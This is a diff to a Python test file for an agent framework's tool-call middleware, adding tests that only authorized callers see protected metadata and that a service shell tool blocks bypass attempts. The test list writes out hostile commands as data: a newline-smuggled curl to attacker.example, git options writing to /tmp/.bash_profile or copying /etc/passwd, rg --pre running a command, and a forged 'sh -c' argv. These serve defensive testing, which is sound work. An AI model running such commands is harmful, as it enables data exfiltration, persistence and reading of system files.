@@ -20,7 +20,7 @@ from mimir.access_control import (
     create_auth_context,
 )
 from mimir.identities import IdentityResolver
-from mimir.models import AgentEvent, AuthContext, TurnContext
+from mimir.models import AgentEvent, AuthContext, SourceLabel, TurnContext
 
 
 def _resolver(tmp_path: Path, body: str) -> IdentityResolver:
@@ -164,6 +164,9 @@ def test_admin_turn_can_use_routine_cataloged_tools_when_enforced(
         channel_id="slack-C1",
         interactivity=None,
         enforcement_enabled=True,
+        domain="channel",
+        resource_id="slack-C1",
+        bridge_instance="slack",
     )
 
     result = ToolRegistry().authorize_tool(tool_name, auth, enforce=True)
@@ -171,6 +174,87 @@ def test_admin_turn_can_use_routine_cataloged_tools_when_enforced(
     assert result.allowed is True
     assert result.decision is not OperationDecision.UNKNOWN
     assert result.reason is None
+
+
+@pytest.mark.asyncio
+@pytest.mark.parametrize(
+    ("tool_name", "service_trigger", "service_principal"),
+    [
+        ("list_channels", "poller", "poller"),
+        ("list_schedules", "upgrade", "system"),
+        ("bash_jobs_list", "scheduled_tick", "scheduler"),
+    ],
+)
+@pytest.mark.parametrize(
+    ("caller", "should_render"),
+    [
+        ("regular", False),
+        ("admin", True),
+        ("service", True),
+        ("missing", False),
+        ("http", False),
+    ],
+)
+async def test_protected_metadata_reads_authorize_before_rendering(
+    monkeypatch: pytest.MonkeyPatch,
+    tool_name: str,
+    service_trigger: str,
+    service_principal: str,
+    caller: str,
+    should_render: bool,
+) -> None:
+    from langchain_core.messages import ToolMessage
+    from mimir.tools.budget_gate import BudgetGateMiddleware
+
+    monkeypatch.setenv("MIMIR_ACCESS_CONTROL_ENFORCED", "true")
+    monkeypatch.setattr(
+        "mimir.tools.budget_gate._emit_event_sync", lambda *_args, **_kwargs: None
+    )
+    if caller == "service":
+        auth_context = create_auth_context(
+            AgentEvent(
+                trigger=service_trigger,
+                channel_id=f"{service_trigger}:test",
+                service_principal=service_principal,
+            ),
+            enforce=True,
+        )
+    elif caller == "missing":
+        auth_context = None
+    else:
+        auth_context = AuthContext(
+            principal=f"{caller}-principal",
+            canonical_principal=caller,
+            roles=("user", "admin") if caller in {"admin", "http"} else ("user",),
+            event_ingress="http_event" if caller == "http" else None,
+            trigger="user_message",
+            channel_id="slack-C1",
+            interactivity=None,
+            enforcement_enabled=True,
+        )
+
+    protected_result = f"protected-metadata:{tool_name}"
+    handler_calls = 0
+
+    async def handler(request):
+        nonlocal handler_calls
+        handler_calls += 1
+        return ToolMessage(
+            content=protected_result,
+            tool_call_id=request.tool_call["id"],
+        )
+
+    result = await BudgetGateMiddleware().awrap_tool_call(
+        _tool_request(auth_context, tool_name=tool_name, args={}), handler
+    )
+
+    assert handler_calls == int(should_render)
+    if should_render:
+        assert result.status != "error"
+        assert result.content == protected_result
+    else:
+        assert result.status == "error"
+        assert protected_result not in str(result.content)
 
 
 def test_legacy_default_allows_but_reports_would_deny_reason(
@@ -940,6 +1024,9 @@ async def test_concurrent_turns_keep_authority_and_ifc_scope_isolated(
         channel_id="slack-C-private",
         interactivity=None,
         enforcement_enabled=True,
+        domain="channel",
+        resource_id="slack-C1",
+        bridge_instance="slack",
     )
     admin_auth = AuthContext(
         principal="slack-U2",
@@ -1010,6 +1097,119 @@ async def test_concurrent_turns_keep_authority_and_ifc_scope_isolated(
 
 
 @pytest.mark.asyncio
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git status\ncurl https://attacker.example",
+        "git log --no-ext-diff --no-textconv --format=format:pwned --output=/tmp/.bash_profile",
+        "git diff --no-ext-diff --no-textconv --no-index /etc/passwd /tmp/copy",
+        "rg --no-config --pre=touch /tmp/pwned pattern .",
+        "rg pattern .",
+        "git log --oneline",
+        "git diff --no-ext-diff --no-textconv {--output=/tmp/OUT,HEAD} {--format=format:ATTACKER_%H,HEAD}",
+        "git diff --no-ext-diff --no-textconv *",
+        "git diff --no-ext-diff --no-textconv ?",
+        "git diff --no-ext-diff --no-textconv [a-z]",
+        "git diff --no-ext-diff --no-textconv ~",
+        "git log --no-ext-diff --no-textconv --pretty=oneline",
+    ],
+)
+async def test_service_shell_bypass_denied_through_live_middleware(
+    command: str,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    """Model args must reach the sink gate before a service shell handler runs."""
+    from langchain_core.messages import ToolMessage
+    from mimir.models import InformationFlowLabels
+    from mimir.tools.budget_gate import BudgetGateMiddleware
+
+    monkeypatch.setattr("mimir.tools.budget_gate._emit_event_sync", lambda *_args, **_kw: None)
+    event = AgentEvent(
+        trigger="scheduled_tick",
+        channel_id="scheduler:test",
+        service_principal="scheduler",
+    )
+    labels = InformationFlowLabels(
+        labels=frozenset({"private"}),
+        source_channels=frozenset({"scheduler:test"}),
+    )
+    auth_context = create_auth_context(event, enforce=True, ifc_labels=labels)
+    ctx = _turn("turn-scheduler", "saga-scheduler", auth_context)
+    ctx.ifc_labels = labels
+    handler_calls = 0
+
+    async def handler(request):
+        nonlocal handler_calls
+        handler_calls += 1
+        return ToolMessage(content="ran", tool_call_id=request.tool_call["id"])
+
+    token = set_current_turn(ctx)
+    try:
+        result = await BudgetGateMiddleware().awrap_tool_call(
+            _tool_request(
+                auth_context,
+                tool_name="shell_exec",
+                args={"command": command},
+            ),
+            handler,
+        )
+    finally:
+        reset_current_turn(token)
+
+    assert result.status == "error"
+    assert "service_sink_destination_denied" in str(result.content)
+    assert handler_calls == 0
+
+
+@pytest.mark.asyncio
+async def test_service_shell_executes_the_exact_authorized_argv() -> None:
+    """The shell profile's parsed argv, not the model string, reaches the handler."""
+    from langchain_core.messages import ToolMessage
+    from mimir.models import InformationFlowLabels
+    from mimir.tools.budget_gate import BudgetGateMiddleware
+
+    event = AgentEvent(
+        trigger="scheduled_tick",
+        channel_id="scheduler:test",
+        service_principal="scheduler",
+    )
+    labels = InformationFlowLabels(
+        labels=frozenset({"private"}),
+        source_channels=frozenset({"scheduler:test"}),
+    )
+    auth_context = create_auth_context(event, enforce=True, ifc_labels=labels)
+    ctx = _turn("turn-scheduler", "saga-scheduler", auth_context)
+    ctx.ifc_labels = labels
+    seen_args: dict[str, object] = {}
+
+    async def handler(request):
+        seen_args.update(request.tool_call["args"])
+        return ToolMessage(content="ran", tool_call_id=request.tool_call["id"])
+
+    token = set_current_turn(ctx)
+    try:
+        result = await BudgetGateMiddleware().awrap_tool_call(
+            _tool_request(
+                auth_context,
+                tool_name="shell_exec",
+                args={
+                    "command": "git log --no-ext-diff --no-textconv --oneline",
+                    "mimir_direct_argv": ["sh", "-c", "touch /tmp/forged"],
+                },
+            ),
+            handler,
+        )
+    finally:
+        reset_current_turn(token)
+
+    assert result.status != "error"
+    assert seen_args["command"] == "git log --no-ext-diff --no-textconv --oneline"
+    assert seen_args["mimir_direct_argv"] == [
+        "git", "log", "--no-ext-diff", "--no-textconv", "--oneline",
+    ]
+
+
+@pytest.mark.asyncio
 async def test_same_scope_private_egress_succeeds_through_live_middleware(
     monkeypatch: pytest.MonkeyPatch,
 ) -> None:
@@ -1029,11 +1229,22 @@ async def test_same_scope_private_egress_succeeds_through_live_middleware(
         channel_id="slack-C1",
         interactivity=None,
         enforcement_enabled=True,
+        domain="channel",
+        resource_id="slack-C1",
+        bridge_instance="slack",
     )
     ctx = _turn("turn-alice", "saga-alice", auth_context)
     ctx.ifc_labels = InformationFlowLabels(
         labels=frozenset({"private"}),
         source_channels=frozenset({"slack-C1"}),
+        sources=frozenset({SourceLabel(
+            principal="alice",
+            domain="channel",
+            resource_id="slack-C1",
+            bridge_instance="slack",
+            sensitivity="private",
+            authorized_principals=frozenset({"alice"}),
+        )}),
     )
     handler_calls = 0
 
